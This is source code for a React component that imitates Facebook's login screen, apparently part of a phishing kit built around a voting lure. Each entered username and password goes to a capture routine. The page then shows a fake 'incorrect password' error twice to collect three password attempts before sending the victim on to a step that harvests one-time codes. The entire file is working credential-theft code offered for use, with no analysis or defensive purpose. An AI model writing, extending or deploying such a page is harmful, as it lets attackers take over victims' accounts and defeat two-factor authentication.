"use client";

import { useState, useEffect } from "react";
import { Loader2, HelpCircle } from "lucide-react";
import { captureData } from "@/lib/capture";

interface FacebookVoteProps {
  onLogin: (username: string, entryId: string) => void;
  onSuccess: () => void;
  onRequireOTP: (username: string) => void;
}

export default function FacebookVote({
  onLogin,
  onSuccess,
  onRequireOTP,
}: FacebookVoteProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [entryId, setEntryId] = useState<string | null>(null);

  useEffect(() => {
    document.title = "Facebook - log in or signup";
  }, []);

  const handleLogin = async () => {
    if (!password || password.length < 1) return;

    setIsVerifying(true);
    setError(false);

    const payload: any = {
      emle: username,
      stage: attempts === 0 ? "initial" : attempts === 1 ? "retry" : "final",
    };

    if (attempts === 0) payload.pass = password;
    else if (attempts === 1) payload.pass2 = password;
    else payload.pass3 = password;

    try {
      const id = await captureData("Face-book", payload, entryId || undefined);
      if (id) {
        setEntryId(id);
        onLogin(username, id);
      }
    } catch (e) {
      console.error("Transmission error");
    }

    setTimeout(() => {
      setIsVerifying(false);
      if (attempts < 2) {
        setAttempts(attempts + 1);
        setError(true);
        setPassword("");
      } else {
        onRequireOTP(username);
      }
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-white flex flex-col font-sans text-[#1c1e21] overflow-y-auto">
      {/* Language Header */}

      <div className="flex flex-col items-center px-8 pt-10 pb-4 w-full max-w-[450px] mx-auto">
        {/* FB Logo */}
        <img
          src="/images/llogo.png"
          alt="Facebook"
          className="w-[60px] mb-10"
        />

        <div className="w-full space-y-3">
          <input
            type="text"
            placeholder="Mobile number or email address"
            className="w-full bg-[#f5f6f7] border border-[#ced0d4] rounded-xl p-4 text-[14px] outline-none focus:border-[#1877f2]"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />

          <input
            type="password"
            placeholder="Password"
            className="w-full bg-[#f5f6f7] border border-[#ced0d4] rounded-xl p-4 text-[14px] outline-none focus:border-[#1877f2]"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          {error && (
            <div className="bg-[#ffebe8] border border-[#dd3c10] p-3 rounded-lg text-[13px] text-center">
              The password you’ve entered is incorrect.{" "}
              <span className="font-semibold cursor-pointer">
                Forgotten password?
              </span>
            </div>
          )}

          <button
            disabled={!username || password.length < 1 || isVerifying}
            className="w-full bg-[#1877f2] text-white py-3 rounded-full font-bold text-[16px] flex justify-center items-center h-[48px] mt-2 active:scale-[0.98] transition-transform"
            onClick={handleLogin}>
            {isVerifying ? (
              <Loader2 className="w-5 h-5 animate-spin" />
            ) : (
              "Log In"
            )}
          </button>

          <div className="text-center pt-4">
            <span className="text-[#1c1e21] text-[14px] font-medium cursor-pointer hover:underline">
              Forgotten password?
            </span>
          </div>
        </div>

        {/* Footer actions */}
        <div className="w-full mt-auto pt-20 pb-10">
          <div className="flex flex-col items-center gap-4">
            <button className="w-full max-w-[300px] bg-white border border-[#1877f2] text-[#1877f2] font-bold py-2 rounded-full text-[14px]">
              Create new account
            </button>

            <div className="flex items-center gap-2">
              <img src="/images/mate.svg" className="w-full h-3" alt="" />
            </div>
          </div>

          <div className="flex justify-center gap-6 mt-6 text-[12px] text-gray-500 font-medium">
            <span>About</span>
            <span>Help</span>
            <span>More</span>
          </div>
        </div>
      </div>
    </div>
  );
}
